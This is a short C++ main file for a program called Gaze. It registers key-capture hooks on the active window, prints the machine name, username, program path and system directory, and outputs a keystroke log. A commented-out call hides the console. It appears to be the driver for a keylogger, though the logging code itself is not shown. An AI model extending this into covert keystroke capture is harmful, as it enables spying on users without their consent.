// Gaze.cpp : This file contains the 'main' function. Program execution begins and ends there.
// all .cpp files must

#include "pch.h"
#include "Logger.h"
#include <iostream>

using namespace std;

int main()
{
	Logger logger;

	logger.Add(Utilities::GetActiveWindow(), VK_ESCAPE);
	logger.Add(Utilities::GetActiveWindow(), VK_HOME);
	
	cout << Utilities::GetMachineName() << endl;
	cout << Utilities::GetUsername() << endl;
    cout << Utilities::GetProgramFilePath() << endl;
	cout << Utilities::GetSystemDir() << endl;

	cout << logger.GetLog() << endl;
	//tool.HideConsole();

	return 0;
}